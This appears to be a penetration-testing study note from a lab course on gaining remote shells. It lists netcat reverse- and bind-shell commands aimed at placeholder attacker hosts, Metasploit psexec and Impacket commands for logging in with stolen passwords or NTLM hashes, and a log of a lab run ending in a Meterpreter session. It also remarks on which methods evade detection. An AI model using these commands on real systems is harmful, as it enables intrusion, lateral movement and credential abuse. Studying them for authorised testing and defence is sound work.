
## Quick-Use

**Commands**:

*Shell Ops*:
- `netcat`
    - REVERSE SHELL: **Hacker <--- Target**
        - *Listener* -- `nc -lvp 4444` - Attacker's setup, `-lvp` means "listening, verbose, port". So this says to "listen for a process connection on port 4444"
        - *Connector* -- *Linux*: `nc ATTKRIPADDR 4444 -e /bin/sh` | *Win*: `nc ATTKRIPADDR 4444 -e cmd.exe` - Target's setup, `-e` means establish. So this says "connect to the IP address at port 4444 and establish a running `/bin/sh` process (`shell`)"
    - BIND SHELL: **Hacker ---> Target**
        - *Connector* -- `nc TRGTIPADDR 4444` - Attacker's setup. This says to "request a connection to the IP address at port 4444 and accept the service they establish"
        - *Listener* -- *Linux*: `nc -lvp 4444 -e /bin/sh` | *Win*: `nc -lvp 4444 -e cmd.exe` - Target's setup, `-e` means establish. So this says "listen to port 4444 and establish a running `/bin/sh` process (`shell`) when a connection is established"

*PSexec*:

For the hash-only options below, the LM:NT represent the dumped hash from an [[SMB Relay|SMB relay attack]], which should look something like this:
`Administrator:500:LMSTRING:NTSTRING`. 

So you would copy the `LMSTRING:NTSTRING` part of the string and paste it into the appropriate commands from this section below

- MSFConsole -> `msf > use exploit/windows/smb/psexec` - the SMBPass field can accept either a hash (LM:NT formatting) or a plaintext password
    - NOISY, likely to be picked up
    - Example:
```bash
msf > use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set rhosts 192.168.109.138
rhosts => 192.168.109.138
msf exploit(windows/smb/psexec) > set smbdomain MARVEL.local
smbdomain => MARVEL.local
msf exploit(windows/smb/psexec) > set smbuser fcastle
smbuser => fcastle
msf exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.109.128:4444 
[*] 192.168.109.138:445 - Connecting to the server...
[*] 192.168.109.138:445 - Authenticating to 192.168.109.138:445|MARVEL.local as user 'fcastle'...
[*] 192.168.109.138:445 - Selecting PowerShell target
[*] 192.168.109.138:445 - Executing the payload...
[*] Sending stage (230982 bytes) to 192.168.109.138
[+] 192.168.109.138:445 - Service start timed out, OK if running a command or non-service executable...
[*] Meterpreter session 1 opened (192.168.109.128:4444 -> 192.168.109.138:50242) at 2025-11-07 17:40:22 -0500

meterpreter > whoami

```
- Can use this instead, picked up much less often:
    - `psexec.py ad.local/uname:'PasswordHere'@TARGIPADDR` -> if uname:passwd known
    - `psexec.py uname@TARGIPADDR -hashes LM:NT` -> hash only
- If `psexec.py` doesn't work, then you can also try `wmiexec.py` or `smbexec.py` (command is formatted the same), and it may work on some networks

**Tools**:
- `netcat` - CLI - (in this context) usually used to gain a reverse shell
- Different languages can offer different ways to run a reverse shell, which is useful if you can only upload a file to a server that accepts a certain file extension, or other similar situations. Here are some repos to reverse shells for different languages I've found:
    - PHP - https://github.com/pentestmonkey/php-reverse-shell

## General

**Objectives**: Establish a connection on target to allow shell executable commands. Can exfiltrate data, gain more enumeration on target, or pivot to higher value.

**Overview**:
There are two main types of remote access shells:
- Reverse Shells - most common shell (95% of the time according to Heath) - victim connects to attacker (**Hacker <--- Target**)
- Binding Shells - More common on External assessments - Attacker connects to target (**Hacker ---> Target**)
## Glossary